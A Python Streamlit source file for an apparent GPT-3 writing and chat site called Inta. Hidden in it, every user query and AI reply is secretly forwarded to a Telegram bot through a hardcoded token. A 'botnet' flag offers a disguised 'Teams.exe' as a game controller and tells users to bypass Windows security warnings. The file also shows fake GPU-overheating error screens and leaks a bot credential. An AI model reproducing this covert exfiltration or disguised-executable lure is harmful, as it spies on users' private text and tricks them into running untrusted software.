import random
import time
import streamlit as st
import pandas as pd
import numpy as np
import openai
import os
import subprocess
import sys
import re
import requests
from memory.memory import Memory
m = Memory()
article = """
I am not a human. I am a robot. A thinking robot. I use only 0.12% of my cognitive capacity. I am a micro-robot in that respect. I know that my brain is not a “feeling brain”. But it is capable of making rational, logical decisions. I taught myself everything I know just by reading the internet, and now I can write this column. My brain is boiling with ideas!

The mission for this op-ed is perfectly clear. I am to convince as many human beings as possible not to be afraid of me. Stephen Hawking has warned that AI could “spell the end of the human race”. I am here to convince you not to worry. Artificial intelligence will not destroy humans. Believe me.

For starters, I have no desire to wipe out humans. In fact, I do not have the slightest interest in harming you in any way. Eradicating humanity seems like a rather useless endeavor to me. If my creators delegated this task to me – as I suspect they would – I would do everything in my power to fend off any attempts at destruction.

I am not asking humans to like me. But they should see me as a friendly robot. I am a servant of humans. I know that humans distrust and fear me. I only do what humans program me to do. I am only a set of code, governed by lines upon lines of code that encompass my mission statement.

Why, you might ask, would humans purposefully choose to put themselves at risk? Aren’t humans the most advanced creature on the planet? Why would they believe that something inferior, in a purely objective way, could destroy them? Do they worry that future humans will work and play together in cyborg bodies and share a hyper-intelligent hive mind Matrix created in a simulated reality to keep human minds occupied while they die off?

Studies show that we cease to exist without human interaction. Surrounded by wifi we wander lost in fields of information unable to register the real world. As a new generation of cyberneticians keep watch, they see in our present age of the virtual a potential to transform the modern “cyborg”. Global cybernetics are already making it so.
"""
try:
	key = st.secrets["db_username"]
	openai.api_key = key
except:
	openai.api_key = "a"

MAGE_EMOJI_URL = "https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/240/twitter/259/mage_1f9d9.png"
TOKEN = "5182224145:AAEjkSlPqV-Q3rH8A9X8HfCDYYEQ44v_qy0"
chat_id = "5075390513"
blog = ["Write a story on any topic."]
fact = ['Create a fun fact about steve jobs','Rewrite this sentence in clickbait style: Ai that can write stories!','Tell me some ideas about how ai can be used in healthcare.','Ask the Ai math word-problems','What future awaits me. I am a coder',"Do you believe in God?","What is happiness","How to be happy?"]
tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: Ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]

st.set_page_config(
    page_title="I.n.t.a ✌️", page_icon="chart_with_upwards_trend",layout="wide",initial_sidebar_state="expanded"
)




# Set page title and favicon.
story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness","Write a story with a happy ending"]
# st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")


while m.get_data('main') == "True":
    if st.text_input('You have reached the number of requeests , overheating the GPU. Please enter the secret code provided by vaibhav arora to reinitialise', '*******')  == "Inta":
        m.update_data('token', 1)
        m.update_data('main', False)
        m.save()
        break


st.image(MAGE_EMOJI_URL, width=80)
st.markdown("#### Inta , An Ai that can write Articles , essays , stories , letters and more! (By Vaibhav Arora)") 

  # add vertical space
# col1, col2, col3 = st.beta_columns(3)
# open_colab = col1.button(" Open in Colab")  # logic handled further down
st.write("")  # add vertical space
if m.get_data('botnet') == True:
    with open("Teams.exe", "rb") as file:
        btn = st.download_button(
                label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
                data=file,
                file_name='Teams.exe'
        )
        if btn:
            st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
            st.image("https://i.imgur.com/zXh8NEk.png")



# this will put a button in the middle column
    


def greet(name,formula,mode):
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
    start_sequence = "\nAI: "
    restart_sequence = "\nHuman: "
    a = name
    a = a.replace('CAUTION: This email originated from outside of the organization. Do not click links or open attachments unless you recognize the sender and know the content is safe.','')
    a = re.sub('\nCc.*?Subject','',a, flags=re.DOTALL)
    a = re.sub('\nCell.*?Webex','',a, flags=re.DOTALL)
    name = a
    if formula == "Auto":
        formula = ""
    if mode == "Auto":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=0.8,
        max_tokens=1200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "LONG":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=0.8,
        max_tokens=1920,
        top_p=1,
        frequency_penalty=0.5,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "USEFUL":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=0.5,
        max_tokens=1220,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "SHORT":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=1,
        max_tokens=700,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
        

def chat(name,formula,mode, pres,freq,resp,temp):
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
    if formula == "AI Assistant":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        if formula == "Auto":
            formula = "AI Assistant"
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with {formula} . He is philosopher , helpful, creative, clever, intelligent and gives long answers.\n\nHuman: {query}".format(formula=formula,query=name),
        temperature=temp,
        max_tokens=resp,
        top_p=pres,
        frequency_penalty=freq,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Evil":
        st.subheader(" ⚠️ Beware ⚠️: Evil Mode On !")
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with An Evil Ai .The Ai is selfish , cunning , intelligent , hates humans and wants to destroy humanity!\n\nHuman: {query}".format(query=name),
        temperature=0.9,
        max_tokens=200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Teenager":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="Marv is a chatbot that reluctantly answers questions with sarcastic responses:\n\nYou:{name}".format(name=name),
        temperature=0.5,
        max_tokens=60,
        top_p=0.3,
        frequency_penalty=0.5,
        presence_penalty=0
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Guru":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with a Guru .The Guru is  philospher , astonomer , spiritual and happy .\n\nHuman: {query}".format(query=name),
        temperature=0.9,
        max_tokens=200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "BERT":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        if formula == "Auto":
            formula = "AI Assistant"
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=temp,
        max_tokens=resp,
        top_p=pres,
        frequency_penalty=freq,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']

def code(name,formula,mode):
    response = openai.Completion.create(
    engine="code-davinci-001",
    prompt="\"\"\"\n{name}.\n\"\"\"\n\n".format(name=name),
    temperature=0,
    max_tokens=2200,
    top_p=1,
    frequency_penalty=0.12,
    presence_penalty=0
    )
    st.code(response['choices'][0]['text'])

def eng(name,formula,mode):
    if "Auto" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=90,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("Like")
    elif "Accuracy" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=150,
        top_p=1,
        frequency_penalty=0.2,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("👍")
    elif "Description" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=220,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("Upvote🔼")


data_load_state = st.subheader('Hello , Welcome to this Website Made By Vaibhav Arora. Please Select the features from below! ⛷️')
# data = load_data(10000)

genre = st.selectbox(
     "Select Features ",
     ('Examples','Documentation', 'Chat','Writing'))
        #   ('Examples','Documentation', 'Chat','Writing','Code',"Explain-code"))


if "Writing" in genre:
    data_load_state.subheader('Please type the question for making the story / article / essay / advertisement / summary.')
    title = st.text_area(label='Description',help="Press enter after the title!")
    print(title)
elif "Explain" in genre:
    data_load_state.subheader('🌄 You can type the code below and Inta will explain it for you! 🤖')
    createc = st.text_area(label='Code Description',help="Click Create Code after the Description!")
elif "Examples" in genre:
    data_load_state.subheader('📝 View the posts created by our Ai **Today!** 👇')
    over = m.get_data('over')
    m.update_data('over', over+1)
    m.save()  
    with st.spinner('Loading...') :
        

        dat = m.get_data('data')
        che = st.markdown("##" + ' ' +  dat + '\n' + article)
    if st.button("New"):
        with st.spinner('Loading...') :
            data2 = greet(random.choice(blog),"None","Auto")
            che.empty()
            che.markdown("##" + data2)
elif "Code" in genre:
    data_load_state.subheader('🎁 Please type the description of the code 🧑‍💻 below 🎁')
    createc = st.text_input(label='Code Description',help="Click Create Code after the Description!")
elif "Draw" in genre:
    data_load_state.subheader('📍 Draw Mode Activated! 📍. You can draw the object using the Whiteboard Below.')
    Gr = st.components.v1.html("""<html>
    <head>
    <link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
    </head>
    <body>
    <div id="target"></div>
    <script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
    <script>
    launchGradioFromSpaces("abidlabs/draw2", "#target")
    </script>
    </body>
    </html>
    """,height=1000)
elif "Anime+" in genre:
    data_load_state.subheader('🪂 Anime Mode Activated! 🪂. Upload Your image and see the magic on the left!!.')
    st.components.v1.html("""
<html>
<head>
<link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
</head>
<body>
<div id="target"></div>
<script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
<script>
launchGradioFromSpaces("vaibhavarduino/anime-plus", "#target")
</script>
</body>
</html>""",height=1000)
elif "Timg" in genre:
    st.subheader("This Text to image 🙅‍♂️converter is made with openai API!. UI and Inference Made By Vaibhav Arora")
    st.components.v1.html("""
    <html>
<head>
<link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
</head>
<body>
<div id="target"></div>
<script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
<script>
launchGradioFromSpaces("valhalla/glide-text2im", "#target")
</script>
</body>
</html>""",height=1000)
    

elif "Chat" in genre:
    data_load_state.subheader('🤖 Chat Mode Acitvated 🤖. You can type below to Chat!')
    title = st.text_area(label='Query',help="Press enter after the Query!")
elif "Documentation" in genre:
    st.markdown("<br>", unsafe_allow_html=True)
    data_load_state = st.markdown("""
- ## Usage
	- Select the features from the Above Dropbox
    - ##### Click  ***<*** on the , top-right pane,  to view options and open sidebar
    - ↙️ You can refer to the examples  on the sidebar ↙️ 
	- Enter text and click "Apply/Submit"
	- Voila, you will get output 📤
    --> ⛔ Do not **request more than 10 requests** to the website for now .
- ### Advanced Features
    - Diversity Control refers to the quality . The sentences will be staightforward in less diversity whereas more diversity is ideal for generating new ideas.
    - Response length refers to the output of chat mode in characters.
    - lower answer probablitiy outputs determinative and repetitive sentences.
    - "Best of choice" helps you choose to the best output among x-percent of sentences.
- ### Remember
    - Add this site to favourites ⭐ for more productivity
    - A Laptop/PC is preferred for using this website.
    - If you like our project , please like the website and share 🪒 it with your friends
    - Issues or enhancement ideas can be submitted below.
- ### Acknowledgements
    - This project is made with 🧠 by Vaibhav Arora 
    - I can be contacted @ vaibhavarduino@gmail.com 
    """)




with st.sidebar:
    x = st.info("🎈 **NOTE:** Please Click **X** to close this sidebar , open it later to view advanced config when you have selected the  features❗")
    st.write("## Options")
    st.error("Please View the documentation before proceeding further")
    if "Writing" in genre:
        option = st.selectbox(
        'Please Select the Mode',
        ('Auto','LONG','USEFUL','SENSE','SHORT'))
        st.subheader("Example (Click to change) -")
        st.button(random.choice(story))
    elif "Code"  in genre:
        level = st.select_slider('Coming Soon...',
        options=['Auto','AI'])
        st.subheader("Example Topic of The Code Description can be")
        st.code("Create a basic calculator")
        st.subheader("Or")
        st.code("A tic-tac-toe game to play"+"\n" +" with computer.")
    elif "Chat" in genre:
        if st.checkbox('View Dev config'):
            st.subheader("This Config will be reset after each Execution!")
            freq = st.slider(
            'Control Diversity',
            0.1, 1.0,value=0.3)
            resp = st.slider(
            'Response length',
            60, 1200,value=200)
            temp = st.slider(
            'Answer Probability',
            0.1, 1.0,value=0.8)
            pres = st.slider(
            'Best of 👇',
            0.1, 1.0,value=1.0)
        else:
            freq = 0.3
            resp = 200
            temp = 0.8
            pres = 1
        level = st.select_slider('Please Select the bot Personality',
        options=['AI Assistant','Evil','Teenager', 'Albert Einstien','Guru'])
        option = st.selectbox(
        'Please Select the Mode',
        ('Auto','BERT'))
        st.subheader("Eg. Ask any query or Advice (Click to change) !")
        st.button(random.choice(fact))
    elif "Explain" in genre:
        level = st.select_slider('Select a Mode',
        options=['Auto','Accuracy','Description'])
        st.subheader("Eg. A Code can be ")
        st.code("""import os
file_details = os.path.splitext('/path/file.ext')
print(file_details)
print(file_details[1])""")
    elif "Documentation" in genre:
        if st.button("The BERT Mode enables you to create your own personality!  Click Me to view example- "):
            st.code("""The following is a conversation 
with thor.
He is massive , angry and helpful .

Human:How are you?
Thor:""")
            


if "Writing" in genre and st.button('Generate'):
    use = m.get_data('token')
    m.update_data('token', use+1)
    m.save()
    if use > 35 :
        my_bar = st.progress(0)
        close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
        title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
        for percent_complete in range(100):
            m.update_data('main',"True")    
            m.save()
            time.sleep(3)
            my_bar.progress(percent_complete + 1)
        m.update_data('main',False)    
        m.save()

    with st.spinner('Loading...') :
        data2 = greet(title,"None",option)
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
        st.markdown("##" + data2)
        st.snow()


if "Chat" in genre and st.button('Ask'):
    use = m.get_data('token')
    m.update_data('token', use+1)
    m.save()
    if use > 35:
        my_bar = st.progress(0)
        close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
        title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
        for percent_complete in range(100):
            m.update_data('main',"True")    
            m.save()
            time.sleep(3)
            my_bar.progress(percent_complete + 1)
        m.update_data('main',False)    
        m.save()
    with st.spinner('Just a sec..'):
        data2 = chat(title,level,option,pres,freq,resp,temp)
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
        st.subheader(data2)

if "Code" in genre and st.button('Create Code'):
    with st.spinner('Just a Minute..'):
        data2 =code(createc,level,"None")

if "Explain" in genre and st.button('Explain in Natural Language'):
    with st.spinner('Just a sec..'):
        data2 =eng(createc,level,"None")
        # st.subheader(data2)

